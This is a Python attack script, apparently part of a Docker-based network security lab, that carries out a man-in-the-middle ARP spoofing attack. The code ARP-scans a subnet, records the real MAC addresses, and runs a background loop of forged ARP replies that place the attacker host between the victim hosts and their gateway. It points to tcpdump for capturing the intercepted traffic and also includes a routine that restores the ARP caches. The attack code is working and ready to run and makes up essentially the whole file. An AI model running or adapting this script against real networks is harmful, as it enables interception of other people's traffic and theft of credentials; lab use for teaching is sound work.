#!/usr/bin/env python3
"""
Ataque 3 — MitM + ARP Spoofing
John se posiciona entre los hosts de network1 (alice/bob) y su gateway (router_a)
interceptando todo su trafico saliente.

Flujo:
  start -> ARP scan para descubrir victimas -> guarda MACs reales -> bucle de envenenamiento
  stop  -> mata el bucle -> envia ARPs correctivos con MACs originales

Uso: python3 attack_mitm.py [start|stop|status]
"""

import sys
import os
import signal
import time
import json

PID_FILE   = "/tmp/attack_mitm.pid"
CACHE_FILE = "/tmp/attack_mitm_cache.json"

JOHN_IP = "192.168.1.100"
GW_IP   = "192.168.1.1"    # router_a


def get_iface_by_ip(ip):
    import subprocess
    out = subprocess.check_output(["ip", "-4", "addr"]).decode()
    current = None
    for line in out.splitlines():
        if line[0].isdigit():
            current = line.split(":")[1].strip().split("@")[0]
        elif ip in line:
            return current
    return "eth0"


def arp_scan(iface, subnet):
    """Descubre hosts activos en la subred via ARP. Devuelve dict {ip: mac}."""
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
        iface=iface, timeout=3, verbose=False
    )
    return {rcvd.psrc: rcvd.hwsrc for _, rcvd in ans}


def spoof(target_ip, target_mac, spoof_ip, john_mac, iface):
    """ARP reply: le dice a target que spoof_ip tiene la MAC de john."""
    from scapy.all import ARP, Ether, sendp
    pkt = (
        Ether(src=john_mac, dst=target_mac) /
        ARP(op=2, pdst=target_ip, hwdst=target_mac,
                  psrc=spoof_ip,  hwsrc=john_mac)
    )
    sendp(pkt, iface=iface, verbose=False)


def restore(target_ip, target_mac, real_ip, real_mac, iface):
    """ARP gratuitous con la MAC real para limpiar la cache envenenada."""
    from scapy.all import ARP, Ether, sendp
    pkt = (
        Ether(src=real_mac, dst="ff:ff:ff:ff:ff:ff") /
        ARP(op=2, pdst=target_ip, hwdst=target_mac,
                  psrc=real_ip,   hwsrc=real_mac)
    )
    sendp(pkt, iface=iface, verbose=False)


def attack_loop(cache):
    iface     = cache["iface"]
    john_mac  = cache["john_mac"]
    gw_mac    = cache["gw_mac"]
    victims   = cache["victims"]   # {ip: mac}

    print(f"[MITM] Bucle activo en {iface} — envenenando {len(victims)} victima(s)", flush=True)
    for ip, mac in victims.items():
        print(f"[MITM]   victima {ip} ({mac})", flush=True)
    print(f"[MITM]   gateway {GW_IP} ({gw_mac})", flush=True)

    while True:
        for v_ip, v_mac in victims.items():
            # Victima cree que John es el gateway
            spoof(v_ip,  v_mac,  GW_IP,  john_mac, iface)
            # Gateway cree que John es la victima
            spoof(GW_IP, gw_mac, v_ip,   john_mac, iface)
        time.sleep(1)


def start():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        print(f"[!] El ataque ya esta activo (PID {pid}). Para primero con 'stop'.")
        sys.exit(1)

    iface = get_iface_by_ip(JOHN_IP)
    print(f"[MITM] Escaneando network1 en {iface}...")

    hosts = arp_scan(iface, "192.168.1.0/24")

    # Separar gateway y john del resto (victimas)
    gw_mac   = hosts.pop(GW_IP,    None)
    john_mac = hosts.pop(JOHN_IP,  None)
    # Solo incluir IPs del rango DHCP (192.168.1.10 - 192.168.1.99)
    # para excluir IPs internas del bridge Docker (.174, .254, etc.)
    victims = {
        ip: mac for ip, mac in hosts.items()
        if ip.startswith("192.168.1.") and 10 <= int(ip.split(".")[-1]) <= 99
    }

    if not gw_mac:
        print(f"[!] No se encontro el gateway {GW_IP}. Verifica que router_a esta activo.")
        sys.exit(1)
    if not victims:
        print(f"[!] No se encontraron victimas en network1. Verifica alice/bob.")
        sys.exit(1)

    if john_mac is None:
        # Obtener MAC de John desde su propia interfaz
        import subprocess
        out = subprocess.check_output(["ip", "link", "show", iface]).decode()
        for token in out.split():
            if len(token) == 17 and token.count(":") == 5:
                john_mac = token
                break

    print(f"[MITM] Gateway encontrado: {GW_IP} -> {gw_mac}")
    for ip, mac in victims.items():
        print(f"[MITM] Victima encontrada: {ip} -> {mac}")

    cache = {
        "iface":    iface,
        "john_mac": john_mac,
        "gw_mac":   gw_mac,
        "victims":  victims,
    }
    with open(CACHE_FILE, "w") as f:
        json.dump(cache, f)

    pid = os.fork()
    if pid > 0:
        open(PID_FILE, "w").write(str(pid))
        print(f"[+] MitM + ARP Spoofing iniciado (PID {pid})")
        print(f"    Verifica en alice/bob:    arp -n  (router_a {GW_IP} debe mostrar la MAC de John)")
        print(f"    Verifica en router_a:     arp -n  (victimas deben mostrar la MAC de John)")
        print(f"    Captura trafico en John:  tcpdump -i {iface} -n")
        sys.exit(0)

    os.setsid()
    sys.stdout = open("/tmp/attack_mitm.log", "w", buffering=1)
    sys.stderr = sys.stdout
    attack_loop(cache)


def cleanup():
    if not os.path.exists(CACHE_FILE):
        print("[!] No hay cache de MACs guardada, no se puede restaurar.")
        return

    with open(CACHE_FILE) as f:
        cache = json.load(f)

    iface   = cache["iface"]
    gw_mac  = cache["gw_mac"]
    victims = cache["victims"]

    print("[MITM] Restaurando caches ARP con MACs originales...")
    for _ in range(5):
        for v_ip, v_mac in victims.items():
            restore(v_ip,  v_mac,  GW_IP, gw_mac, iface)
            restore(GW_IP, gw_mac, v_ip,  v_mac,  iface)
        time.sleep(0.3)

    os.remove(CACHE_FILE)
    print("[+] MitM detenido. Caches ARP restauradas.")


def stop():
    if not os.path.exists(PID_FILE):
        print("[-] El ataque no esta activo.")
        return

    pid = int(open(PID_FILE).read().strip())
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(0.5)
    except ProcessLookupError:
        print("[!] Proceso no encontrado, limpiando PID file.")

    os.remove(PID_FILE)
    cleanup()


def status():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        alive = os.path.exists(f"/proc/{pid}")
        state = "activo" if alive else "PID file huerfano"
        print(f"[*] MitM + ARP Spoofing: {state} (PID {pid})")
        print(f"    Log: tail -f /tmp/attack_mitm.log")
        if os.path.exists(CACHE_FILE):
            with open(CACHE_FILE) as f:
                c = json.load(f)
            print(f"    Iface:   {c.get('iface')}")
            print(f"    John MAC: {c.get('john_mac')}")
            for ip, mac in c.get("victims", {}).items():
                print(f"    Victima: {ip} ({mac})")
    else:
        print("[-] MitM + ARP Spoofing: inactivo")


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ("start", "stop", "status"):
        print(f"Uso: {sys.argv[0]} [start|stop|status]")
        sys.exit(1)
    {"start": start, "stop": stop, "status": status}[sys.argv[1]]()
